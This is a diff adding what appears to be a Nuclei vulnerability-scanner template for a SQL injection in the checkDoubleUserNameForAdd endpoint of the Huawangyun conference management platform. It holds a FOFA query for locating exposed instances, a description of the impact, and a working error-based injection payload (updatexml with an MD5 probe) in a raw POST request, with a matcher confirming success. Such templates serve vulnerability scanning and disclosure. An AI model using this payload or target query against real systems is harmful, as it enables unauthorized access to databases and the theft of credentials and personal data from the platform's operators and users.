@@ -1,0 +1,31 @@
+id: huawangyun-checkDoubleUserNameForAdd-sql
+
+info:
+  name: "华望云会议管理平台 checkDoubleUserNameForAdd 接口 SQL 注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="	华望云会议管理平台	"
+      华望云会议管理平台的checkDoubleUserNameForAdd接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句实现对数据库的未授权访问，进而泄露敏感数据（如管理员凭证、用户个人信息）或在具备高权限条件下向服务器写入恶意代码，最终控制服务器系统权限。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487371&idx=1&sn=8d7d011f98ff7a400bbaa93ae499d1b9&chksm=c267bab8f51033aee10ece91a3bd4133c0bcf0a9ab92ffa0d3fbcfde92a0ea3392b53addd4f4&token=286085064&lang=zh_CN#rd
+  tags: 华望云会议管理平台
+
+
+http:
+- raw:
+  - |
+    POST /ajax/checkDoubleUserNameForAdd HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    userName=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+MD5(123456))),1))+and+'%25%25'+like+'
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'e10adc3949ba59abbe56e057f20f883e'
+
+
+
